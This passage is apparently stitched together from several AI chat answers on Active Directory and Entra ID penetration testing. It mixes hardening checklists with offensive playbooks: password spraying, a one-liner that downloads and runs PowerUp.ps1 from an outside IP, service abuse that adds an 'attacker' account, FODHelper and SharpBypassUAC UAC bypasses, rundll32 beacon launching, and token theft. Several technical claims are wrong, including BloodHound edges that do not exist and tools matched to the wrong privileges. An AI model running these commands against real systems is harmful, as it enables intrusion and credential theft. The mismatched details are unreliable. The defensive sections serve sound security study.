\$\_.PasswordLastSet -gt (Get-Date).AddDays(-10) }

\# Last logon date for a specific user

Get-ADUser -Identity Administrator -Properties LastLogonDate \| Select
Name, LastLogonDate

**4. Identify Common Weaknesses & Vulnerabilities**

- **Kerberos Pre-authentication Disabled (ASREPRoast Attack)**\
  Users without Kerberos pre-authentication can be targeted for offline
  password cracking:

Get-ADUser -Filter 'userAccountControl -band 4194304' -Properties
userAccountControl \| Format-Table Name

- **Excessive Privileges in Sensitive Groups**\
  Check membership of high-privileged groups (e.g., DNSAdmins) which can
  allow DLL hijacking or SYSTEM-level control:

Get-ADGroupMember -Identity "DNSAdmins" -Recursive

- **Passwords or Secrets in User Description Fields**\
  Sometimes credentials or keys are stored insecurely in descriptions:

Get-ADUser -Filter {description -like '\*'} -Properties SamAccountName,
Description \| Select SamAccountName, Description

- **SMB Signing Disabled (Risk of SMB Relay Attacks)**\
  If SMB signing is off, attackers can capture and relay authentication
  to escalate privileges:

Get-SmbServerConfiguration \| Select RequireSecuritySignature

- **ACL/ACE Misconfigurations (Privilege Escalation via Access
  Control)**\
  Misconfigured permissions can allow standard users to modify GPOs,
  change passwords, or escalate privileges:

Get-ADUser -Filter \* \| ForEach-Object { (Get-Acl
"AD:\$(\$\_.DistinguishedName)").Access }

------------------------------------------------------------------------

**5. Offensive Techniques & Additional Tips**

- **Password Spraying**\
  Attempt the same password across multiple accounts to avoid lockouts
  and gain access:

Get-ADUser -Filter \* \| Select-Object -ExpandProperty Name \| Out-File
users.txt

Invoke-DomainPasswordSpray -Userlist .\users.txt -Password "Password123"
-Verbose

- **Use 64-bit PowerShell on 32-bit systems for better compatibility**

powershell.exe -c "\[Environment\]::Is64BitProcess"

cd C:\Windows\sysnative\WindowsPowerShell\v1.0\\

powershell.exe -c "\[Environment\]::Is64BitProcess"

- **Leverage publicly available scripts for comprehensive checks**\
  Example: PowerUp.ps1 for privilege escalation checks:

iex (New-Object
Net.WebClient).DownloadString('http://10.10.14.75:81/PowerUp.ps1');
Invoke-AllChecks

- **Dump hashes or clear cached credentials after privilege escalation**
  to maintain access or move laterally.

------------------------------------------------------------------------

**External and Internal Penetration Testing on Active Directory and
Microsoft Entra ID**

**Overview**

Active Directory (AD) and Microsoft Entra ID (Azure AD) are critical
components of enterprise identity and access management. Attackers
exploit specific AD attributes and permissions to perform
reconnaissance, lateral movement, privilege escalation, and persistence.
Understanding these attributes and their exploitation methods is
essential for both offensive testing and defensive hardening.

**Key**

## Enumeration / Discovery

- **Module 1 – Active Directory Enumeration and Local Privilege
  Escalation**

  - Enumerating users, groups, ACLs, trusts, etc.

  - Finding local admin privileges

🔸 **Relevant Techniques:**

- net user, net group, dsquery, PowerView

- Enumerating ACLs, SPNs, GPOs

- BloodHound usage

- Gathering AD Trusts and Forest data

## Reconnaissance / Enumeration

| **Technique** | **Stage in Attack Chain** | **Description** |
|----|----|----|
| **LLMNR/NBT-NS Poisoning** | Reconnaissance / Credential Access | Intercept name resolution to capture NTLMv2 challenge-response hashes. |

## Initial Access / Reconnaissance

- **Threat: Unpatched Vulnerabilities**

- **Threat: Default Security Settings**

- **Threat: Missing Monitoring Alerts**

- Attackers scan for exploitable services or use phishing, drive-by
  downloads, or exploitation of weak external interfaces.

🔸 **Relevant Techniques:**

- Exploiting unpatched AD-connected services (e.g., SMB, LDAP)

- Abuse default configurations

- Bypass insufficient logging/auditing

## Enumeration in Active Directory & Microsoft Entra ID

Active Directory (AD) and Microsoft Entra ID (Azure AD) are often
targeted during penetration tests to identify users, computers, groups,
and misconfigurations that can be leveraged for privilege escalation and
lateral movement.

This guide focuses on **internal enumeration** using native Windows
PowerShell cmdlets (Get-ADUser, Get-ADComputer, Get-ADGroup, etc.) and
highlights common weaknesses attackers exploit.

## Common Attack Steps & Commands for AD / Entra ID Penetration Testing

**1. Username and Group Enumeration**

- Query user accounts and groups:

- Get-ADUser -Filter \* -Properties SAMAccountName, UserPrincipalName,
  MemberOf, Mail, Description

- Get-ADGroupMember -Identity "Domain Admins"

- Use BloodHound/SharpHound to map relationships and privileges:

- SharpHound.exe -c All

**2. Password and Account Attacks**

- Check for locked accounts and brute force attempts:

- Search-ADAccount -LockedOut

- Force password reset on targets:

- Set-ADAccountPassword -Identity username -Reset -NewPassword
  (ConvertTo-SecureString "NewP@ssw0rd!" -AsPlainText -Force)

**3. Privilege Escalation & Token Manipulation**

- Exploit SeImpersonatePrivilege for token theft with Impacket:

- python3 atexec.py -target victim -command "whoami"

- Use PowerSploit or Mimikatz to escalate privileges:

- Invoke-TokenManipulation -StealToken username

**4. Lateral Movement**

- Use SMB and WinRM with stolen tokens or credentials:

- smbclient //target/share -U username

- winrs -r:http://target:5985 -u:username cmd.exe

- Use BloodHound results to identify paths:

- Invoke-BloodHound -CollectionMethod All

**5. Persistence & Cleanup**

- Modify user attributes or group memberships:

- Add-ADGroupMember -Identity "Domain Admins" -Members username

- Take ownership of files or change attributes:

- Invoke-TakeOwn -Path "C:\SensitiveData"

**Weaknesses and Security Risks**

- **Excessive Permissions:** Over-permissioned users (SeDebugPrivilege,
  SeImpersonatePrivilege) enable privilege escalation.

- **Exposed Attributes:** Information like mail, description, and
  homedirectory enable social engineering and targeted attacks.

- **Weak Account Controls:** Lack of lockout policies and monitoring
  allows brute force and password spraying.

- **Poor Group Management:** Unmonitored privileged groups facilitate
  lateral movement and persistence.

- **Unrestricted Logon Hours/Workstations:** Allows attackers to exploit
  time and location policies.

**Summary**

**Active Directory and Microsoft Entra ID penetration testing
involves:**

- Enumerating users, groups, and key attributes for reconnaissance.

- Exploiting privileges like SeImpersonatePrivilege, SeDebugPrivilege
  for escalation.

- Utilizing tools such as Impacket, PowerSploit, BloodHound, Mimikatz.

- Performing lateral movement using SMB, WinRM, or token impersonation.

- Targeting attributes and permissions to persist or exfiltrate data.

Hardening requires strict privilege management, attribute minimization,
strong account policies, monitoring logon behaviors, and continuous
auditing.

------------------------------------------------------------------------

If you'd like, I can help you craft specific PowerShell scripts or
command sets for enumerating and exploiting these privileges during a
penetration test!

Certainly! Here’s a **corrected, concise, and well-structured summary**
of the external and internal penetration testing concepts for Active
Directory and Microsoft Entra ID privileges, attributes, commands,
weaknesses, and mitigations:

------------------------------------------------------------------------

**Active Directory & Microsoft Entra ID Penetration Testing Summary**

------------------------------------------------------------------------

**1. SeSystemtimePrivilege**

- **Description:** Allows a user or process to adjust the system time.

- **Use in Attack:** Manipulating system time can bypass time-based
  defenses (e.g., Kerberos ticket expiry).

- **BloodHound Query:**

- MATCH
  p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanChangeSystemTime\]-\>()

- RETURN p

- **Exploitation Tool & Command:**

  - Mimikatz:

  - sekurlsa::pth /domain:target /user:username /ntlm:hash
    /run:powershell.exe

- **Mitigation:** Restrict this privilege to trusted administrators
  only.

------------------------------------------------------------------------

**2. SeShutdownPrivilege**

- **Description:** Allows shutting down or restarting the system.

- **Use in Attack:** Can disrupt services by unauthorized shutdown or
  reboot.

- **BloodHound Query:**

- MATCH p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanShutdown\]-\>()

- RETURN p

- **Exploitation Tool & Command:**

  - CrackMapExec:

  - cme smb \<target\> -u \<username\> -p \<password\> --exec-command
    "shutdown /r /t 0"

- **Mitigation:** Limit to trusted administrators and monitor use.

------------------------------------------------------------------------

**3. SeCreateTokenPrivilege**

- **Description:** Allows creating access tokens.

- **Use in Attack:** Create custom tokens for privilege escalation and
  impersonation.

- **BloodHound Query:**

- MATCH p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanCreateToken\]-\>()

- RETURN p

- **Exploitation Tool:**

  - SharpSploit

- **Mitigation:** Restrict to trusted processes only.

------------------------------------------------------------------------

------------------------------------------------------------------------

**Summary of Pentesting Steps & Commands**

1.  **Enumerate privileges** via BloodHound Cypher queries to identify
    users/groups with sensitive privileges.

2.  **Exploit powerful privileges** like SeSystemtimePrivilege (time
    manipulation), SeShutdownPrivilege (disrupt services), and
    SeCreateTokenPrivilege (token creation).

3.  **Use Mimikatz, CrackMapExec, SharpSploit, PowerShell modules** for
    exploitation.

4.  **Perform Active Directory user enumeration** using Get-ADUser
    PowerShell commands to gather attributes for further attack
    planning.

5.  **Mitigate by restricting sensitive privileges to trusted admins and
    processes**, and regularly monitor privilege assignments and account
    states.

------------------------------------------------------------------------

If you want, I can provide you with a ready-made PowerShell script or
BloodHound queries to automate enumeration and exploitation testing
based on these privileges and attributes.

## Overview

- **Active Directory (AD)** is a Microsoft Windows Server-based
  directory service.

- **Active Directory Domain Services (AD DS)** manages directory data
  storage and access, maintaining information such as user accounts
  (usernames, passwords, contact info) and enabling network users to
  access resources securely.

- AD serves as the critical control center in most Windows network
  environments, making it a prime target for attackers.

- Microsoft reports that **over 95 million AD accounts are attacked
  daily**, with Azure Active Directory alone experiencing **25.6 billion
  brute force attacks in 2021**.

- AD is notoriously challenging to secure, leading to many successful
  attacks.

## Common Threats to Active Directory

- **Default Security Settings:** Microsoft’s out-of-the-box security
  settings for AD may not align with an organization’s needs. Attackers
  often exploit known default configurations.

- **Excessive Privileged Access:** Domain user and admin accounts
  sometimes have overly broad or inappropriate privileges. "Superuser"
  accounts hold nearly unrestricted control and are often targeted.

- **Excessive Role-Based Access:** Employees may have access beyond what
  is necessary for their roles, increasing attack surface.

- **Unpatched Vulnerabilities:** Unpatched operating systems,
  applications, or firmware on AD servers provide attackers with initial
  footholds.

- **Lack of Monitoring and Alerts:** Without proper Windows auditing and
  alerting, it’s difficult to distinguish between legitimate and
  malicious activity or track unauthorized changes.

**Penetration Testing Modules**

**Module 1: Active Directory Enumeration & Local Privilege Escalation**

- Enumerate key AD objects: users, groups, group memberships, computers,
  trusts, ACLs, etc. to map attack paths.

- Practice local privilege escalation techniques on Windows machines.

- Identify local admin privileges on target domain machines.

- Abuse enterprise apps to execute complex attack paths, bypass
  antivirus, and pivot across machines.

**Module 2: Lateral Movement, Domain Privilege Escalation &
Persistence**

- Extract credentials and sessions of high-privilege accounts (e.g.,
  Domain Admins).

- Perform credential replay attacks using built-in protocols.

- Bypass application whitelisting and escalate privileges by pivoting
  with local admin rights.

- Exploit Kerberoasting and its variants for privilege escalation.

- Exploit delegation and Protected Groups for privilege escalation.

- Abuse Kerberos features for persistence (Golden Ticket, Silver
  Ticket).

- Subvert domain authentication via Skeleton Key and custom Security
  Support Providers (SSPs).

- Persist through DC Safe Mode Administrator and AdminSDHolder
  protections.

**Module 3: Domain Persistence, Dominance & Enterprise Admin
Escalation**

- Use minimal privileges to perform attacks like DCSync by modifying
  ACLs on domain objects.

- Modify domain controller host security descriptors to persist and run
  commands without Domain Admin privileges.

- Elevate privileges from child Domain Admin to Enterprise Admin by
  abusing trust keys and krbtgt account.

- Perform intra-forest trust attacks to access cross-forest resources.

- Exploit database links for cross-forest code execution.

**Module 4: Defenses — Monitoring, Architecture, and Bypassing
Detection**

- Understand important Windows event logs generated by these attacks.

- Learn recommended architecture and security improvements:

  - Temporal group membership

  - ACL auditing

  - Local Administrator Password Solution (LAPS)

  - SID filtering and selective authentication

  - Credential Guard, Windows Defender Application Control (WDAC)

  - Protected Users Group, Privileged Access Workstations (PAW)

  - Tiered administration and Enhanced Security Administrative
    Environment (ESAE/Red Forest)

- Study Microsoft Advanced Threat Analytics (ATA) and similar tools'
  detection methods and techniques to bypass them.

- Explore deploying deception technologies as an AD defense mechanism.

If you want, I can help you expand on any of these modules or provide
practical tools and techniques for the tests!

Here’s a corrected and concise summary of your **Penetration Testing on
Windows Active Directory (2019, 2022, 2025)** focusing on default
accounts and key Kerberos-related attacks:

**Penetration Testing on Windows Active Directory (2019, 2022, 2025)**

**Default Local Accounts in Active Directory**

Microsoft Windows AD includes several default built-in accounts critical
for domain operations:

- **Administrator account**: The built-in domain administrator with full
  privileges.

- **Guest account**: A limited access account typically disabled by
  default.

- **HelpAssistant account**: Created during Remote Assistance sessions.

- **KRBTGT account**: Used by the Kerberos Key Distribution Center (KDC)
  to encrypt and sign Kerberos tickets.

Reference: [Microsoft Docs - Default User
Accounts](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts#administrator-account)

**Kerberos Authentication Process (Brief)**

- Kerberos authenticates users and services by issuing time-limited
  tickets signed with the KRBTGT account’s key.

- Tickets grant access to resources without repeatedly submitting
  passwords.

**Key Kerberos-Related Attacks**

- **Golden Ticket Attack:**\
  Forging Kerberos Ticket Granting Tickets (TGT) using the KRBTGT
  account hash, allowing attackers to impersonate any user—including
  non-existent ones—and access any application or service within the
  domain indefinitely.

- **Kerberoasting (Kerberos Brute Force):**\
  Attackers request service tickets for service accounts, extract their
  hashes offline, and brute-force them to retrieve plaintext
  credentials.

- **AS-REP Roasting:**\
  Targets user accounts that do not require pre-authentication by
  requesting AS-REP responses and brute-forcing the encrypted hashes
  offline.

- **Domain Controller (DC) Backdoor with Skeleton Key:**\
  A malware implant that allows attackers to bypass normal
  authentication by injecting a "master key" into the DC’s
  authentication process.

- **Dumping Domain Hashes:**\
  Extracting password hashes from the Domain Controller to use for
  offline attacks, pass-the-hash, or further privilege escalation.

If you want, I can help provide detailed steps or detection techniques
for each attack!

## Recommended Defenses:

- LAPS (Local Admin Password Solution)

- Admin tiering (ESAE/Red Forest)

- GPO hardening

- Credential Guard, Device Guard

- Properly auditing and rotating the KRBTGT account

## AD Security checklist

| **Category** | **Hardening Focus** |
|----|----|
| **LLMNR Poisoning** | Disable LLMNR/NBT-NS; enable DNSSEC; use SMB signing. |
| **AS-REP Roasting** | Ensure all accounts require Kerberos preauthentication. |
| **ForceChange / GenericWrite** | Audit AD ACLs regularly; remove excessive delegated rights. |
| **Password Spraying** | Use account lockout policies and MFA; monitor for failed logins. |
| **RunForPrivilege** | Review and restrict SYSTEM-level scheduled tasks and startup apps. |
| **Pass-the-Ticket** | Use short TGT lifetimes, enable AES-only encryption, reset passwords of compromised users regularly. |
| **Vulnerable GPOs** | Audit GPO permissions and ownership; monitor GPO changes. |
| **SQL Abuse** | Harden SQL Server configurations, disable TRUSTWORTHY setting, monitor linked server usage. |
| **Domain Trusts** | Minimize inter-domain trust; use selective authentication; monitor for DCSync abuse. |

# Delivery

The attacker delivers the weaponized payload or gains initial access
inside the AD environment.

- Methods:

  - Phishing emails targeting domain users, often with malicious macros
    or links.

  - Exploiting exposed services like Remote Desktop or vulnerable VPNs
    to gain a foothold.

  - Using stolen credentials to log in or deploying malware on a
    workstation inside the domain.

# Getting access

Attackers prepare tools or payloads tailored for AD exploitation.

- Examples:

  - Crafting malicious PowerShell scripts or Mimikatz modules to extract
    credentials.

  - Creating phishing emails with weaponized Office documents that run
    code to steal AD credentials.

  - Preparing tools like Rubeus for Kerberos ticket abuse or Impacket
    for lateral movement.

## Credential Access / Credential Theft

- **Use SMB v2/v3+**

  - Prevents attacks leveraging SMBv1 vulnerabilities (e.g.,
    EternalBlue) used for initial compromise and lateral movement.

- **Default domain Administrator & KRBTGT password should be changed
  regularly**

  - Protects against Golden Ticket attacks and reuse of old credentials.

- **No user or computer accounts in admin groups**

  - Limits credential exposure in privileged groups.

- **Ensure admin accounts are "sensitive & cannot be delegated"**

  - Mitigates Kerberos delegation abuse (like unconstrained delegation).

- **Add admin accounts to "Protected Users" group**

  - Protects against credential theft by disabling NTLM, Kerberos
    delegation, and offline credential caching for these accounts.

- **Limit service account rights & use Managed Service Accounts**

  - Reduces risk from Kerberoasting attacks (which request service
    tickets to crack passwords).

- **Set WDigest registry key to 0 (disable plaintext credential
  caching)**

  - Mitigates credential theft from memory (WDigest credential dumping).

- **Patch quickly, especially privilege escalation vulnerabilities**

  - Stops exploits targeting LPE on workstations or servers, common in
    initial post-compromise stages.

- **Enable enhanced auditing and logging (PowerShell logs, CMD process
  logging, SIEM centralization)**

  - Detects attempts to dump credentials, run malicious commands, or use
    credential dumping tools like Mimikatz.

## 3. Credential Dumping

- NTDS.dit extraction

- SAM database dumping

- Kerberoasting (cracking service account tickets)

- DCSync attacks with Mimikatz

- LLMNR/NBT-NS poisoning with Responder

- Extraction of plaintext, hashes, Kerberos tickets with Mimikatz

- Windows Credential Manager abuse

## Authentication-Related Attacks

**Stage: Initial Access → Credential Access → Privilege Escalation**

These tests and techniques are used to identify and exploit weaknesses
in authentication mechanisms—especially public-facing or internally
exposed web applications and portals (e.g., OWA, RD Web, VPN, Citrix).

| **Technique** | **Stage** | **Description** |
|----|----|----|
| **HTTP Authentication Exploitation** | Initial Access | Exploit web login flaws (e.g., HTTP Basic auth, missing brute-force protection) |
| **Broken Authentication Exploitation** | Initial Access | Abuse poorly implemented session management, logic flaws |
| **Test for User Enumeration** | Reconnaissance | Determine valid usernames from error messages or response timing |
| **Brute Force Protection Testing** | Credential Access | Identify if repeated logins are rate-limited or blocked |
| **Default Logins / Password Reset Testing** | Initial Access / Credential Access | Check if default or guessable credentials are still active |
| **Password Change, CAPTCHA, Autocomplete Testing** | Credential Access / Defense Evasion | These checks look for UI-based weaknesses to automate or abuse login mechanisms |

**Dictionary & Password Attacks**

**Stage: Credential Access**

These tools are used to **obtain valid credentials** by guessing
passwords for services such as SSH, RDP, SMB, LDAP, or HTTP.

| **Tool / Technique** | **Stage** | **Description** |
|----|----|----|
| **Hydra / Medusa / Ncrack** | Credential Access | Parallelized brute-force against network services |
| **Crunch / CeWL / Cupp** | Recon → Credential Access | Generate wordlists tailored to the target (e.g., company themes) |
| **Online Attacks** | Credential Access | Direct attacks against live services (e.g., AD login portal) |

**🔓 Password Attacks**

**Stage: Credential Access → Privilege Escalation → Lateral Movement**

This phase includes post-compromise techniques like sniffing, guessing,
cracking, or dumping hashes.

| **Technique** | **Stage** | **Description** |
|----|----|----|
| **Brute Force Password Guessing** | Credential Access | Repetitive login attempts until successful |
| **Dictionary Attack** | Credential Access | Uses a list of common passwords against logins or hashes |
| **Password Database Access** | Credential Access | Involves dumping LSASS memory or SAM database |
| **Sniffing Passwords** | Credential Access | Through MiTM (ARP poisoning, RDP, etc.) |

**🧠 Password & Key Cracking**

**Stage: Credential Access**

Used **after** acquiring password hashes from NTDS.dit, SAM, or Kerberos
tickets, typically **offline attacks**.

| **Technique** | **Stage** | **Description** |
|----|----|----|
| **Rainbow Tables** | Credential Access | Precomputed hash tables used to crack unsalted password hashes (e.g., NTLM) |
| **Botnet Command & Control / Hosting Malicious Data** | Command & Control | Used to automate cracking or deliver cracked credentials |
| **CAPTCHA Solving / Dynamic Attack Points** | Initial Access | Bypass login restrictions or DDoS protections |
| **Exploits Exist Already** | Exploitation | Known CVEs that bypass authentication or allow password access |

**🧭 Summary Mapping to MITRE ATT&CK and AD Kill Chain:**

| **Kill Chain Phase**     | **Techniques Used**                              |
|--------------------------|--------------------------------------------------|
| **Reconnaissance**       | User enumeration, wordlist generation            |
| **Initial Access**       | Brute force web login, default credentials       |
| **Credential Access**    | Password spraying, hash cracking, rainbow tables |
| **Privilege Escalation** | Reusing compromised passwords to elevate         |
| **Lateral Movement**     | Using valid credentials over RDP, SMB, WMI       |
| **Defense Evasion**      | CAPTCHA bypass, avoiding account lockout         |
| **Command & Control**    | Botnet tools for cracking or credential exchange |

# Privilege Escalation

**1. Tactics, Techniques, and Strategies**

- **Service Permission Abuse:** Identify Windows services with
  misconfigured permissions allowing modification or replacement of the
  executable or its arguments.

- **Service Binary Replacement:** Replace vulnerable service binaries or
  commands to escalate privileges on service restart.

- **User Account Control (UAC) Bypass:** Exploit weak UAC configurations
  using various bypass techniques such as SharpBypassUAC or
  registry-based FODHelper method.

- **Local Privilege Escalation (LPE):** Use known vulnerabilities, weak
  permissions, or configuration errors in Windows OS or applications.

- **Scheduled Task Abuse:** Modify or create scheduled tasks that run
  with elevated privileges.

------------------------------------------------------------------------

**2. Tools Used**

| **Tool** | **Purpose** |
|----|----|
| **PowerUp.ps1** | Automated Windows local privilege escalation checks and exploits. |
| **SharpBypassUAC** | Bypass UAC to escalate privileges. |
| **PowerShell** | Registry and system configuration manipulation. |
| **Cobalt Strike** | Execute assemblies and payload delivery. |

------------------------------------------------------------------------

**3. Common Vulnerabilities Exploited**

- Misconfigured **service permissions** (allowing users to modify
  service executable path or arguments).

- Weak or **default UAC settings** that can be bypassed.

- Windows features with **auto-elevate capabilities** (e.g., FODHelper).

- Lack of registry monitoring allowing exploitation of registry-based
  UAC bypass.

- Services running as **SYSTEM or Administrator** with writable paths.

------------------------------------------------------------------------

**4. Security Risk Severity**

- **High to Critical**: Privilege escalation allows attackers to gain
  SYSTEM or Administrator privileges locally, enabling complete control
  over the host.

- May enable **persistence**, **credential theft**, and **lateral
  movement**.

- In AD environments, escalated privileges can be used to attack the
  domain.

------------------------------------------------------------------------

**5. Impact on Workload**

- Escalation reduces attacker friction, facilitating:

  - Deployment of further tools or payloads.

  - Access to sensitive data and domain credentials.

  - Execution of domain attacks like DCSync or Golden Ticket forgery.

------------------------------------------------------------------------

**6. Key Steps and Commands**

**A. Using PowerUp for Privilege Escalation Checks**

\# Import PowerUp module (if not already loaded)

Import-Module .\PowerUp.ps1

\# Run all checks for privilege escalation opportunities

Invoke-AllChecks

- Look for vulnerable services and permissions.

**B. Exploiting Vulnerable Service Permissions**

- Use PowerUp’s service abuse function to exploit misconfigured
  services:

\# Exploit a vulnerable service named AbyssWebServer by running a
command as SYSTEM

Invoke-ServiceAbuse -Name "AbyssWebServer" -Command "net user attacker
Password123 /add"

- To replace the service binary and restart the service (requires write
  access to service binary):

\# Write malicious binary or command to the service

Write-ServiceBinary -Name "AbyssWebServer" -Command
"c:\path\to\malicious.exe"

\# Restart the service to trigger execution

net stop AbyssWebServer

net start AbyssWebServer

------------------------------------------------------------------------

**C. UAC Bypass Using SharpBypassUAC**

- From a Cobalt Strike beacon or PowerShell session:

beacon\> execute-assembly /path/to/SharpBypassUAC.dll

- Alternatively, generate an encoded command to run payload via
  rundll32:

echo -n 'cmd /c start rundll32 c:\\users\\public\\beacon.dll,EntryPoint'
\| base64

------------------------------------------------------------------------

**D. UAC Bypass Using FODHelper (Registry Method)**

1.  **Prepare the command to run with elevated privileges:**

\$cmd = "cmd /c start powershell.exe"

2.  **Modify registry keys to hijack auto-elevate executable:**

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force

New-ItemProperty -Path
"HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name
"(Default)" -Value \$cmd -Force

Set-ItemProperty -Path
"HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name
"DelegateExecute" -Value "" -Force

3.  **Trigger the auto-elevation by launching FODHelper:**

Start-Process "C:\Windows\System32\fodhelper.exe"

4.  **Cleanup registry:**

Start-Sleep -Seconds 3

Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force

------------------------------------------------------------------------

**Summary Table**

| **Technique** | **Description** | **Privilege Needed** | **Risk Level** | **Tool/Command Example** |
|----|----|----|----|----|
| Service Permission Abuse | Modify vulnerable service executable or args | Low | High | Invoke-ServiceAbuse, Write-ServiceBinary |
| UAC Bypass (SharpBypassUAC) | Bypass Windows UAC to elevate privileges | Standard User | High | execute-assembly SharpBypassUAC |
| UAC Bypass (FODHelper) | Registry-based auto-elevation UAC bypass | Standard User | High | Registry edits + fodhelper.exe |

------------------------------------------------------------------------

If you'd like, I can help create detailed playbooks for each of these
steps, with mitigations and detection strategies too!

Great! Here’s a **detailed Windows and Active Directory Privilege
Escalation Playbook** with:

- Step-by-step tactics and techniques

- Commands and tool usage

- Detection and mitigation advice

------------------------------------------------------------------------

**Windows & Active Directory Privilege Escalation Playbook**

------------------------------------------------------------------------

**1. Service Permission Abuse**

**Overview**

Abuse misconfigured Windows service permissions to escalate privileges
by changing service binaries or commands.

**Prerequisites**

- Local user access (low privilege user)

- Ability to query and modify service permissions (some cases require
  write access to service executable path or service config)

**Tools**

- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerUp.ps1)

- Built-in Windows commands (sc, net)

**Commands & Steps**

\# Load PowerUp

Import-Module .\PowerUp.ps1

\# Check for vulnerable services

Invoke-AllChecks \| Where-Object { \$\_.ServiceName -ne \$null -and
\$\_.Vulnerable -eq \$true }

\# Exploit vulnerable service by running a command as SYSTEM

Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "net user
attacker P@ssw0rd /add"

\# Or replace service binary with malicious executable (if writable)

Write-ServiceBinary -Name "VulnerableServiceName" -Command
"C:\Path\To\malicious.exe"

\# Restart the service to trigger execution

net stop VulnerableServiceName

net start VulnerableServiceName

**Detection**

- Monitor Windows event logs for service stop/start events by unexpected
  users

- Monitor changes to service binary paths or permissions

- Use SIEM rules to alert on suspicious service modifications

**Mitigation**

- Harden service permissions with least privilege

- Restrict who can modify service configurations

- Apply application whitelisting and code integrity policies

------------------------------------------------------------------------

**2. UAC Bypass — SharpBypassUAC**

**Overview**

Bypass User Account Control (UAC) to execute code with elevated
privileges.

**Prerequisites**

- Standard user access

- Ability to execute .NET assemblies or PowerShell scripts

**Tools**

- SharpBypassUAC ([GitHub repo](https://github.com/hfiref0x/UACME))

- Cobalt Strike or PowerShell

**Commands & Steps**

1.  Download or compile SharpBypassUAC.dll.

2.  Execute SharpBypassUAC from a beacon or PowerShell session:

\# From Cobalt Strike Beacon

execute-assembly /path/to/SharpBypassUAC.dll

3.  Or encode a command to launch a payload with rundll32:

echo -n 'cmd /c start rundll32 C:\Users\Public\beacon.dll,EntryPoint' \|
base64

**Detection**

- Monitor process creation events, especially rundll32.exe launching
  unusual DLLs

- Look for suspicious UAC bypass tools in memory or file system scans

**Mitigation**

- Enforce strict UAC policies (e.g., Always Notify)

- Restrict execution of unauthorized PowerShell scripts and DLLs

- Employ endpoint detection and response (EDR) tools

------------------------------------------------------------------------

**3. UAC Bypass — FODHelper Registry Method**

**Overview**

Use Windows auto-elevate binary fodhelper.exe with registry hijacking to
bypass UAC.

**Prerequisites**

- Standard user

- Ability to edit HKCU registry keys

**Commands & Steps**

\# Define the command to run elevated

\$cmd = "cmd /c start powershell.exe"

\# Create registry key path and set command for fodhelper

New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
-Force

Set-ItemProperty -Path
"HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name
"(Default)" -Value \$cmd

Set-ItemProperty -Path
"HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name
"DelegateExecute" -Value ""

\# Trigger UAC bypass by launching fodhelper.exe

Start-Process "C:\Windows\System32\fodhelper.exe"

\# Cleanup registry after execution

Start-Sleep -Seconds 3

Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force

**Detection**

- Monitor registry key creations under
  HKCU:\Software\Classes\ms-settings\Shell\Open\command

- Alert on execution of fodhelper.exe by non-admin users

- Use behavior-based detection for auto-elevate bypass patterns

**Mitigation**

- Restrict registry modifications for standard users

- Apply Windows Defender Exploit Guard or similar

- Keep OS patched (Microsoft occasionally addresses some UAC bypasses)

------------------------------------------------------------------------

**Bonus: General Privilege Escalation Enumeration Using PowerUp**

\# Import PowerUp module

Import-Module .\PowerUp.ps1

\# Run all checks

Invoke-AllChecks

\# Look for specific results like unquoted service paths, weak
file/folder permissions, scheduled task abuse, DLL hijacking, etc.

------------------------------------------------------------------------

**Summary Table**

| **Attack Vector** | **Technique** | **Privilege Required** | **Risk Level** | **Detection** | **Mitigation** |
|----|----|----|----|----|----|
| Service Permission Abuse | Modify service to run malicious code | Low (standard user) | High | Service event logs, SIEM | Harden permissions, monitor |
| UAC Bypass (SharpBypassUAC) | DLL or assembly based bypass | Low (standard user) | High | Process monitoring, EDR | Strong UAC, app whitelisting |
| UAC Bypass (FODHelper) | Registry hijack + fodhelper.exe | Low (standard user) | High | Registry monitoring, process alerts | Restrict registry edits, patch |

------------------------------------------------------------------------

If you'd like, I can also prepare detection signatures, SIEM rules, or
mitigation best practices documents to accompany this playbook. Would
you like me to?

## Privilege Escalation

**External and Internal Penetration Testing: Key Active Directory
Privileges**

**1. SeImpersonatePrivilege**

- **Description:** Allows a user or process to impersonate another user
  after authentication, effectively acting on their behalf.

- **Use in Attack:** Enables token theft and impersonation of privileged
  accounts for lateral movement and privilege escalation.

- **BloodHound Query:**

- MATCH p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanImpersonate\]-\>()

- RETURN p

- **Tools & Commands:**

  - Impacket:

  - atexec.py -k \<target\>

  - PowerShell:

  - Invoke-TokenManipulation -Impersonate

- **Mitigation:** Restrict privilege to trusted administrators only.

------------------------------------------------------------------------

**2. SeLoadDriverPrivilege**

- **Description:** Allows loading and unloading of device drivers;
  highly sensitive and typically restricted to administrators.

- **Use in Attack:** Used to load malicious drivers or escalate
  privileges by manipulating drivers.

- **BloodHound Query:**

- MATCH p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanLoadDriver\]-\>()

- RETURN p

- **Tools & Commands:**

  - Metasploit module:\
    exploit/windows/local/service_permissions

  - PowerShell (Invoke-WMIExec usage)

- **Mitigation:** Restrict this privilege strictly to trusted
  administrators.

------------------------------------------------------------------------

**3. SeBackupPrivilege**

- **Description:** Allows bypassing of certain security restrictions to
  perform backup and restore operations.

- **Use in Attack:** Can be abused to read sensitive files and data,
  bypassing normal file permissions.

- **BloodHound Query:**

- MATCH p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanBackup\]-\>()

- RETURN p

- **Tools & Commands:**

  - Covenant:

  - Invoke-TokenManipulation -Backup

- **Mitigation:** Limit to backup service accounts and trusted admins.

------------------------------------------------------------------------

**4. ForceChangePassword**

- **Description:** Forces a user to change their password at next login.

- **Use in Attack:** Can be leveraged to disrupt user access or perform
  social engineering.

- **BloodHound Query:**

- MATCH p=(:User)-\[:CanChangePassword\]-\>()

